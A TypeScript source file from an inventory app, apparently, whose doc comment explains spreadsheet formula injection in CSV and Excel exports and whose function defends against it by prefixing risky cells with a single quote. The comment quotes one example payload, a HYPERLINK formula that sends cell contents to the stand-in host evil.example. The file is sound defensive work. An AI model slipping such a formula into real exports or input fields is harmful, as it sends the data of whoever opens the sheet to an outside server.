/**
 * Spreadsheet formula injection — one guard, used by every export.
 *
 * The problem
 * -----------
 * SydIN exports inventory to CSV and Excel, and the whole point of those files
 * is that someone opens them in Excel or Google Sheets. Those programs treat a
 * cell whose text begins with `=`, `+`, `-`, `@`, or a lone tab/carriage return
 * as a *formula*, not as text. So an item named
 *
 *     =HYPERLINK("https://evil.example/?d="&A1&A2,"Click for prices")
 *
 * is stored harmlessly in the database, exported correctly, and then executed
 * by the spreadsheet on the machine of whoever opens it. Variants can call
 * `WEBSERVICE()` to post the sheet's contents to a stranger's server, or (with a
 * click-through) launch a local program via DDE.
 *
 * This matters more here than in most apps for a specific reason: the item name
 * is typed by the customer, but the export is often opened by *someone else* —
 * an accountant, a supplier, the shop owner's laptop. The person who types the
 * payload and the person who runs it are not the same person, which is exactly
 * what makes it an attack rather than a footgun.
 *
 * OWASP calls this CSV Injection; the production brief lists it under item 35
 * ("spreadsheet formula injection where relevant") and item 36.
 *
 * The fix
 * -------
 * Prefix the value with a single quote. Excel, LibreOffice and Google Sheets all
 * read a leading `'` as "the rest of this cell is literal text" and do not
 * display it. The value a person sees is unchanged; the formula never runs.
 *
 * Deliberately NOT done: stripping or rejecting the characters. A product
 * legitimately called "-40C Coolant" or an account code beginning with `+`
 * should export exactly as typed. Neutralising is not the same as censoring,
 * and an inventory system that silently mangles product names is worse than one
 * that quotes them.
 *
 * This is separate from CSV *quoting* (doubling `"` and wrapping cells that
 * contain commas or newlines). Quoting keeps the file parseable; this keeps the
 * spreadsheet from executing it. Both are needed, and neither replaces the
 * other — the existing escapers did the first and not the second.
 */

/** Characters a spreadsheet reads as "a formula starts here". */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * Returns the value as safe spreadsheet text. Numbers pass through untouched —
 * they are written as numbers, never parsed as formulas.
 */
export function neutralizeSpreadsheetFormula<T>(value: T): T | string {
  if (typeof value === "number" || value == null) return value;

  const text = String(value);

  return FORMULA_LEAD.test(text) ? `'${text}` : text;
}
